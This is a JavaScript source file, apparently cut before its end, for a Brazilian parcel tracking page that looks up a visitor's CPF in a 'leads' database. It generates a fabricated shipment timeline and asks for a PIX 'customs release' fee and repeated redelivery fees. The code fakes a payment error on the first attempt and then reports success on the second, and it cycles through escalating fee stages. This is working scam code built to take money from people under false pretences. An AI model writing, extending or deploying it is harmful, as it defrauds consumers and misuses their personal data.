/**
 * Sistema de rastreamento baseado APENAS em dados do banco
 * SEM API DE CPF - APENAS DADOS DO SUPABASE
 */
import { DatabaseService } from '../services/database.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { UIHelpers } from '../utils/ui-helpers.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.currentCPF = null;
        this.trackingData = null;
        this.leadData = null; // Dados do banco
        this.zentraPayService = new ZentraPayService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        this.deliveryValues = [7.74, 12.38, 16.46];
        this.deliveryAttempts = 0;
        this.hasAttemptedPayment = false; // Flag para controlar primeiro/segundo pagamento
        this.currentPixData = null; // Armazenar dados do PIX para reutilização
        
        console.log('TrackingSystem inicializado - DADOS DO BANCO');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Fallbacks
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento baseado no banco...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            this.validateZentraPaySetup();
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        if (this.zentraPayService.validateApiSecret()) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        this.setupFormSubmission();
        this.setupCPFInput();
        this.setupTrackButton();
        this.setupModalEvents();
        this.setupCopyButtons();
        this.setupAccordion();
        this.setupKeyboardEvents();
        console.log('Event listeners configurados');
    }

    setupModalEvents() {
        console.log('Configurando eventos dos modais...');
        
        // Modal de liberação aduaneira
        const simulateButton = document.getElementById('simulatePaymentButton');
        const closeButton = document.getElementById('closeModal');
        const modal = document.getElementById('liberationModal');
        
        if (simulateButton) {
            let attemptCount = 0;
            
            console.log('🔧 CONFIGURANDO BOTÃO DE SIMULAÇÃO');
            simulateButton.addEventListener('click', () => {
                attemptCount++;
                
                if (attemptCount === 1) {
                    // Primeira tentativa: erro
                    this.showPaymentError(simulateButton);
                } else {
                    // Segunda tentativa: sucesso
                    this.processSuccessfulPayment();
                    this.closeLiberationModal();
                }
            });
        }
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }
        
        if (modal) {
            // Fechar ao clicar fora
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeLiberationModal();
                }
            });
        }
    }
    
    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }
    
    showPaymentError(button) {
        console.log('❌ Simulando erro de pagamento...');
        
        // Fechar modal atual
        this.closeLiberationModal();
        
        // Mostrar popup de erro após delay
        setTimeout(() => {
            this.showPaymentErrorModal(button);
        }, 300);
    }
    
    showPaymentErrorModal(originalButton) {
        const errorModal = document.createElement('div');
        errorModal.className = 'modal-overlay';
        errorModal.id = 'paymentErrorModal';
        errorModal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;
        
        errorModal.innerHTML = `
            <div style="
                background: white;
                border-radius: 15px;
                max-width: 400px;
                width: 85%;
                padding: 30px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                animation: slideUp 0.4s ease;
                border: 3px solid #e74c3c;
            ">
                <div style="margin-bottom: 20px;">
                    <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                </div>
                <h3 style="color: #2c3e50; font-size: 1.4rem; font-weight: 700; margin-bottom: 15px;">
                    Erro ao Processar Pagamento
                </h3>
                <p style="color: #666; font-size: 1rem; line-height: 1.6; margin-bottom: 25px;">
                    Ocorreu um problema ao processar seu pagamento. Tente novamente.
                </p>
                <div style="display: flex; gap: 15px; justify-content: center;">
                    <button id="tryAgainButton" style="
                        background: #27ae60;
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 8px;
                        cursor: pointer;
                        font-weight: 600;
                        font-size: 1rem;
                        transition: all 0.3s ease;
                        display: inline-flex;
                        align-items: center;
                        gap: 8px;
                    ">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                    <button id="closeErrorButton" style="
                        background: #6c757d;
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 8px;
                        cursor: pointer;
                        font-weight: 600;
                        font-size: 1rem;
                        transition: all 0.3s ease;
                    ">
                        Fechar
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(errorModal);
        document.body.style.overflow = 'hidden';
        
        // Configurar eventos
        const tryAgainButton = errorModal.querySelector('#tryAgainButton');
        const closeErrorButton = errorModal.querySelector('#closeErrorButton');
        
        if (tryAgainButton) {
            tryAgainButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                // Reabrir modal de liberação com botão
                setTimeout(() => {
                    this.reopenLiberationModalWithRetry();
                }, 300);
            });
        }
        
        if (closeErrorButton) {
            closeErrorButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }
        
        // Fechar ao clicar fora
        errorModal.addEventListener('click', (e) => {
            if (e.target === errorModal) {
                this.closePaymentErrorModal();
            }
        });
    }
    
    closePaymentErrorModal() {
        const errorModal = document.getElementById('paymentErrorModal');
        if (errorModal) {
            errorModal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorModal.parentNode) {
                    errorModal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }
    
    reopenLiberationModalWithRetry() {
        // Reabrir modal de liberação com botão de segunda tentativa
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            const pagarViaButton = document.getElementById('pagarViaZentraButton');
            
            // Atualizar botão de simulação para segunda tentativa
            const simulateButton = modal.querySelector('#simulatePaymentButton');
            if (pagarViaButton) {
                pagarViaButton.addEventListener('click', function() {
                    // Mesmo comportamento do botão de simulação
                    if (!this.hasAttribute('data-retry')) {
                        this.setAttribute('data-retry', 'true');
                        alert('Ocorreu um erro ao tentar processar o pagamento');
                        this.textContent = 'Tentar Novamente';
                        return;
                    }
                    
                    // Segunda tentativa - sucesso
                    if (modal) {
                        modal.style.display = 'none';
                    }
                    
                    // Processar pagamento com sucesso
                    if (window.trackingSystemInstance) {
                        window.trackingSystemInstance.processSuccessfulPayment();
                    }
                });
            }
            
            if (simulateButton) {
                simulateButton.innerHTML = '<i class="fas fa-check-circle"></i> SIMULAÇÃO DE PAGAMENTO';
                simulateButton.style.background = 'rgba(39, 174, 96, 0.1)';
                simulateButton.style.color = '#27ae60';
                simulateButton.style.borderColor = 'rgba(39, 174, 96, 0.3)';
                
                // Configurar para sucesso na próxima tentativa
                simulateButton.onclick = () => {
                    this.processSuccessfulPayment();
                    this.closeLiberationModal();
                };
            }
        } else {
            // Se modal não existir, recriar
            this.openLiberationModal();
        }
    }

    setupFormSubmission() {
        const form = document.getElementById('trackingForm');
        if (form) {
            console.log('Form encontrado por ID');
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        document.querySelectorAll('form').forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        const trackButton = document.getElementById('trackButton');
        if (trackButton) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButton);
        }

        document.querySelectorAll('.track-button').forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        document.querySelectorAll('button[type="submit"], button').forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');
        
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const cleanText = pastedText.replace(/[^\d]/g, '');
            if (cleanText.length <= 11) {
                cpfInput.value = cleanText;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) ||
            (e.keyCode === 65 && e.ctrlKey) ||
            (e.keyCode === 67 && e.ctrlKey) ||
            (e.keyCode === 86 && e.ctrlKey) ||
            (e.keyCode === 88 && e.ctrlKey)) {
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && 
            (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;

        const cleanCPF = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cleanCPF.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cleanCPF.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO BUSCA APENAS NO BANCO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            this.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }

        const cpfValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfValue);
        
        console.log('CPF digitado:', cpfValue);
        console.log('CPF limpo:', cleanCPF);

        if (!CPFValidator.isValidCPF(cpfValue)) {
            console.log('CPF inválido');
            this.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        // Adicionar delay mínimo de 1.5s para melhor UX
        const minimumLoadingTime = 1500;
        const startTime = Date.now();
        
        console.log('CPF válido, buscando APENAS no banco...');
        UIHelpers.showLoadingNotification();

        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Aguardar um pouco para mostrar o loading
            await new Promise(resolve => setTimeout(resolve, 1500));

            console.log('🔍 Buscando no banco de dados...');
            
            // Buscar no banco de dados
            const dbResult = await this.getLeadFromLocalStorage(cleanCPF);
            
            if (dbResult.success && dbResult.data) {
                // Garantir tempo mínimo de loading
                const elapsedTime = Date.now() - startTime;
                if (elapsedTime < minimumLoadingTime) {
                    await new Promise(resolve => setTimeout(resolve, minimumLoadingTime - elapsedTime));
                }
                
                console.log('✅ LEAD ENCONTRADO NO BANCO!');
                console.log('📦 Dados do lead:', dbResult.data);
                
                this.leadData = dbResult.data;
                this.currentCPF = cleanCPF;
                
                UIHelpers.closeLoadingNotification();
                
                console.log('📋 Exibindo dados do banco...');
                this.displayOrderDetailsFromDatabase();
                this.generateRealTrackingData();
                this.displayTrackingResults();
                this.saveTrackingData();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    UIHelpers.scrollToElement(orderDetails, 100);
                }
                
                // Destacar botão de liberação se necessário
                setTimeout(() => {
                    this.highlightAndScrollToLiberationButton();
                }, 1000);
                
            } else {
                console.log('❌ CPF não encontrado no banco de dados');
                console.log('❌ CPF não encontrado no banco');
                UIHelpers.closeLoadingNotification();
                this.showCpfNotFoundDialog();
                
                // Mostrar pop-up discreta após 2 segundos
                setTimeout(() => {
                    this.showDiscreteHelpPopup();
                }, 2000);
                this.showCPFNotFoundError();
            }
            
        } catch (error) {
            console.error('Erro no processo:', error);
            UIHelpers.closeLoadingNotification();
            this.showCPFNotFoundError();
        } finally {
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async getLeadFromLocalStorage(cpf) {
        return await this.dbService.getLeadByCPF(cpf);
    }

    displayOrderDetailsFromDatabase() {
        if (!this.leadData) return;

        console.log('📋 Exibindo dados do banco de dados');
        
        const customerName = this.getFirstAndLastName(this.leadData.nome_completo || 'Nome não informado');
        const formattedCPF = CPFValidator.formatCPF(this.leadData.cpf || '');
        
        // Dados básicos
        this.updateElement('customerName', customerName);
        this.updateElement('fullName', this.leadData.nome_completo || 'Nome não informado');
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', customerName);
        
        // Produto
        let productName = 'Produto não informado';
        if (this.leadData.produtos && this.leadData.produtos.length > 0) {
            productName = this.leadData.produtos[0].nome || 'Produto não informado';
        } else if (this.leadData.produto) {
            productName = this.leadData.produto;
        }
        this.updateElement('customerProduct', productName);
        
        // Endereço de entrega
        const deliveryAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerDeliveryAddress', deliveryAddress);
        
        // Endereço completo formatado
        const fullAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerFullAddress', fullAddress);
        
        console.log('✅ Interface atualizada com dados do banco');
        console.log('👤 Nome exibido:', customerName);
        console.log('📄 Nome completo:', this.leadData.nome_completo);
        console.log('📍 Endereço:', fullAddress);
        console.log('📦 Produto:', productName);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
        console.log('📊 Etapa atual:', this.leadData.etapa_atual);
        
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTrackingData() {
        console.log('📦 Gerando dados de rastreamento reais do banco');
        
        if (!this.leadData) {
            console.error('❌ leadData não encontrado para gerar tracking');
            return;
        }
        
        const currentStage = this.leadData.etapa_atual || 1;
        const stageNames = this.getStageNames();
        
        console.log('📊 Gerando etapas até:', Math.max(currentStage, 29));
        
        this.trackingData = {
            cpf: this.leadData.cpf,
            currentStep: currentStage,
            steps: [],
            liberationPaid: this.leadData.status_pagamento === 'pago',
            liberationDate: this.leadData.status_pagamento === 'pago' ? new Date().toISOString() : null,
            deliveryAttempts: 0,
            lastUpdate: this.leadData.updated_at || new Date().toISOString()
        };

        // Gerar etapas de forma segura
        const maxStage = Math.max(currentStage, 29);
        for (let i = 1; i <= maxStage; i++) {
            const stepDate = new Date();
            stepDate.setHours(stepDate.getHours() - (Math.max(currentStage, 11) - i));
            
            const stepData = {
                id: i,
                date: stepDate,
                title: stageNames[i] || `Etapa ${i}`,
                description: stageNames[i] || `Etapa ${i}`,
                isChina: i >= 3 && i <= 7,
                completed: i <= currentStage,
                needsLiberation: i === 11 && this.leadData.status_pagamento !== 'pago'
            };
            
            // Validar dados da etapa antes de adicionar
            if (stepData.id && stepData.description) {
                this.trackingData.steps.push(stepData);
            } else {
                console.error('❌ Dados de etapa inválidos:', stepData);
            }
        }
        
        console.log('✅ Dados de rastreamento gerados:', {
            totalSteps: this.trackingData.steps.length,
            currentStage: currentStage,
            stepsGenerated: this.trackingData.steps.map(s => s.id)
        });
        console.log('📊 Etapa atual:', currentStage);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
    }

    getStageNames() {
        return {
            1: 'Seu pedido foi criado',
            2: 'O seu pedido está sendo preparado para envio',
            3: '[China] O vendedor enviou seu pedido',
            4: '[China] O pedido chegou ao centro de triagem de Shenzhen',
            5: '[China] Pedido saiu do centro logístico de Shenzhen',
            6: '[China] Coletado. O pedido está em trânsito internacional',
            7: '[China] O pedido foi liberado na alfândega de exportação',
            8: 'Pedido saiu da origem: Shenzhen',
            9: 'Pedido chegou no Brasil',
            10: 'Pedido em trânsito para CURITIBA/PR',
            11: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
            12: 'Pedido liberado na alfândega de importação',
            13: 'Pedido sairá para entrega',
            14: 'Pedido em trânsito entrega',
            15: 'Pedido em rota de entrega',
            16: 'Tentativa entrega',
            17: "1ª Tentativa de entrega - Taxa de reenvio necessária",
            18: "Reagendamento da entrega",
            19: "Pedido em trânsito para nova entrega",
            20: "Pedido em rota de entrega",
            21: "2ª Tentativa de entrega - Taxa de reenvio necessária",
            22: "Reagendamento da entrega",
            23: "Pedido em trânsito para nova entrega", 
            24: "Pedido em rota de entrega",
            25: "3ª Tentativa de entrega - Taxa de reenvio necessária",
            26: "Reagendamento da entrega",
            27: "Pedido em trânsito para nova entrega",
            28: "Pedido em rota de entrega",
            29: "4ª Tentativa de entrega - Taxa de reenvio necessária"
        };
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        setTimeout(() => {
            UIHelpers.animateTimeline();
            // Destacar e fazer scroll para o botão de liberação se necessário
            this.highlightAndScrollToLiberationButton();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        // Obter texto exato da etapa atual do banco de dados
        let stageText = '';
        if (this.leadData && this.leadData.etapa_atual) {
            // Usar o texto exato da etapa como está no banco
            const stageNames = this.getStageNames();
            stageText = stageNames[this.leadData.etapa_atual] || `Etapa ${this.leadData.etapa_atual}`;
        } else {
            stageText = 'Pedido chegou na alfândega de importação: CURITIBA/PR';
        }
        
        // Atualizar ícone baseado na etapa atual
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        
        if (currentStage >= 17) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else if (currentStage >= 13) {
            statusIcon.innerHTML = '<i class="fas fa-truck"></i>';
            statusIcon.className = 'status-icon in-delivery';
        } else if (currentStage >= 12) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
        }
        
        // Exibir apenas o texto exato da etapa atual
        currentStatus.textContent = stageText;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) {
            console.error('❌ Timeline container não encontrado');
            return;
        }

        timeline.innerHTML = '';
        console.log('🎬 Renderizando timeline...');
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        console.log('📊 Etapa atual do lead:', currentStage);
        
        this.trackingData.steps.forEach((step, index) => {
            // Mostrar apenas etapas até a etapa atual
            if (step && step.id <= currentStage) {
                const isCurrentStep = step.id === currentStage;
                
                try {
                    const timelineItem = this.createTimelineItem(step, isCurrentStep);
                    
                    // Verificar se o elemento foi criado corretamente
                    if (timelineItem && timelineItem instanceof Node) {
                        timeline.appendChild(timelineItem);
                        console.log(`✅ Etapa ${step.id} adicionada à timeline`);
                    } else {
                        console.error(`❌ Elemento inválido para etapa ${step.id}:`, timelineItem);
                    }
                } catch (error) {
                    console.error(`❌ Erro ao criar/adicionar etapa ${step.id}:`, error);
                }
            } else if (!step) {
                console.error(`❌ Step inválido no índice ${index}:`, step);
            }
        });
        
        console.log('✅ Timeline renderizada com sucesso');
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date instanceof Date ? 
            step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' }) :
            step.date;
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        
        // Botão "LIBERAR PACOTE" na etapa da alfândega (etapa 11) - DIAGNÓSTICO DETALHADO
        let buttonHtml = '';
        
        // DIAGNÓSTICO COMPLETO - Log detalhado das condições
        console.log('🔍 DIAGNÓSTICO BOTÃO LIBERAR PACOTE:', {
            stepId: step.id,
            stepCompleted: step.completed,
            leadData: !!this.leadData,
            statusPagamento: this.leadData?.status_pagamento,
            etapaAtual: this.leadData?.etapa_atual,
            shouldShowButton: step.id === 11 && step.completed && this.leadData?.status_pagamento !== 'pago'
        });
        
        // CONDIÇÃO SIMPLIFICADA E MAIS ROBUSTA
        if (step.id === 11 && step.completed) {
            const statusPagamento = this.leadData?.status_pagamento;
            const shouldShow = !statusPagamento || statusPagamento === 'pendente' || statusPagamento !== 'pago';
            
            console.log('🔓 Etapa 11 detectada - Status pagamento:', statusPagamento, 'Mostrar botão:', shouldShow);
            
            if (shouldShow) {
                console.log('✅ ADICIONANDO BOTÃO LIBERAR PACOTE na etapa 11');
                buttonHtml = `
                    <button class="liberation-button-timeline liberar-pacote-btn" data-step-id="${step.id}" style="
                        background: linear-gradient(45deg, #1e4a6b, #2c5f8a) !important;
                        color: white !important;
                        border: none !important;
                        padding: 12px 25px !important;
                        font-size: 1rem !important;
                        font-weight: 700 !important;
                        border-radius: 25px !important;
                        cursor: pointer !important;
                        transition: all 0.3s ease !important;
                        box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4) !important;
                        animation: liberationPulse 2s infinite !important;
                        font-family: 'Roboto', sans-serif !important;
                        letter-spacing: 0.5px !important;
                        margin-top: 15px !important;
                        display: inline-flex !important;
                        align-items: center !important;
                        gap: 8px !important;
                        z-index: 10 !important;
                    ">
                        <i class="fas fa-unlock"></i> LIBERAR PACOTE
                    </button>
                `;
            } else {
                console.log('❌ Botão não será exibido - pagamento já realizado');
            }
        }
        
        // Botões de tentativas de entrega (etapas 17, 21, 25, 29...)
        if (this.isDeliveryAttemptStage(step.id) && step.id === currentStage) {
            const attemptNumber = this.getAttemptNumber(step.id);
            const attemptValue = this.getAttemptValue(attemptNumber);
            
            buttonHtml += `
                <button class="delivery-button-timeline" data-attempt="${attemptNumber}" data-value="${attemptValue}" style="
                    background: linear-gradient(45deg, #e74c3c, #c0392b);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    font-size: 0.9rem;
                    font-weight: 600;
                    border-radius: 20px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 3px 10px rgba(231, 76, 60, 0.4);
                    margin-top: 10px;
                    display: inline-flex;
                    align-items: center;
                    gap: 6px;
                ">
                    <i class="fas fa-truck"></i> Pagar Taxa R$ ${attemptValue.toFixed(2)}
                </button>
            `;
        }
        
        const timeStr = step.date instanceof Date ?
            step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) :
            step.time || '00:00';

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${step.isChina ? '<span class="china-tag">[China]</span>' : ''}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        if (step.id === 11 && step.completed) {
            const liberationButton = item.querySelector('.liberation-button-timeline');
            if (liberationButton) {
                liberationButton.addEventListener('click', () => {
                    this.openLiberationModal();
                });
            } else {
                // Criar botão separadamente
                const liberationButton = document.createElement('button');
                liberationButton.className = 'liberation-button-timeline';
                liberationButton.setAttribute('data-step-id', step.id);
                liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR PACOTE';
                
                // Adicionar evento
                liberationButton.addEventListener('click', () => {
                    this.openLiberationModal();
                });
                
                // Adicionar ao timeline-text
                const timelineText = item.querySelector('.timeline-text');
                if (timelineText) {
                    timelineText.appendChild(liberationButton);
                    console.log('✅ Botão LIBERAR PACOTE criado e adicionado à timeline');
                } else {
                    console.error('❌ timeline-text não encontrado');
                }
            }
        }

        if (step.id >= 17 && (step.id - 17) % 4 === 0 && step.completed) {
            const deliveryButton = item.querySelector('.delivery-button-timeline');
            if (deliveryButton) {
                deliveryButton.addEventListener('click', () => {
                    const attemptNumber = parseInt(deliveryButton.dataset.attempt);
                    const value = parseFloat(deliveryButton.dataset.value);
                    this.openDeliveryModal(attemptNumber, value);
                });
            }
        }

        return item;
    }

    getDeliveryAttemptNumber(stageId) {
        const attemptMap = {
            16: 1,   // 1ª tentativa
            106: 2,  // 2ª tentativa  
            116: 3,  // 3ª tentativa
            126: 1   // Volta para 1ª (ciclo)
        };
        return attemptMap[stageId] || 1;
    }

    getDeliveryValue(attemptNumber) {
        const values = [7.74, 12.38, 16.46];
        return values[attemptNumber - 1] || 7.74;
    }

    isDeliveryAttemptStage(stageId) {
        return [17, 21, 25, 29].includes(stageId);
    }

    getAttemptNumber(stageId) {
        const attemptMap = {
            17: 1,
            21: 2,
            25: 3,
            29: 4
        };
        return attemptMap[stageId] || 1;
    }

    getAttemptValue(attemptNumber) {
        const values = [7.74, 12.38, 16.46];
        return values[attemptNumber - 1] || 7.74;
    }

    showCpfNotFoundDialog() {
        UIHelpers.showError('CPF não encontrado no sistema. Verifique se o CPF está correto.');
    }

    showDiscreteHelpPopup() {
        console.log('Mostrando popup de ajuda discreta');
    }

    saveTrackingData() {
        if (this.trackingData && this.currentCPF) {
            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
        }
    }

    clearOldData() {
        // Limpar dados antigos se necessário
        console.log('Limpando dados antigos...');
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('focus') === 'cpf') {
            const cpfInput = document.getElementById('cpfInput');
            if (cpfInput) {
                setTimeout(() => cpfInput.focus(), 500);
            }
        }
    }

    setupCopyButtons() {
        console.log('Configurando botões de cópia...');
        
        const copyButtons = document.querySelectorAll('[id*="copyPix"]');
        copyButtons.forEach(button => {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = button.id.replace('copyPix', 'pixCode');
                const targetElement = document.getElementById(targetId);
                
                if (targetElement) {
                    targetElement.select();
                    document.execCommand('copy');
                    
                    const originalText = button.innerHTML;
                    button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                    setTimeout(() => {
                        button.innerHTML = originalText;
                    }, 2000);
                }
            });
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon i');
        
        if (detailsHeader && detailsContent) {
            console.log('🔧 Configurando accordion dos dados do pedido');
            
            detailsHeader.addEventListener('click', () => {
                console.log('📋 Accordion clicado');
                const isExpanded = detailsContent.classList.contains('expanded');
                console.log('📋 Estado atual - expandido:', isExpanded);
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) {
                        toggleIcon.className = 'fas fa-chevron-down';
                    }
                    console.log('📋 Accordion recolhido');
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) {
                        toggleIcon.className = 'fas fa-chevron-up';
                    }
                    console.log('📋 Accordion expandido');
                }
            });
            
            console.log('✅ Accordion configurado corretamente');
        } else {
            console.error('❌ Elementos do accordion não encontrados:', {
                detailsHeader: !!detailsHeader,
                detailsContent: !!detailsContent,
                toggleIcon: !!toggleIcon
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                // Fechar modais abertos
                const modals = document.querySelectorAll('.modal-overlay');
                modals.forEach(modal => {
                    if (modal.style.display === 'flex') {
                        modal.style.display = 'none';
                    }
                });
            }
        });
    }

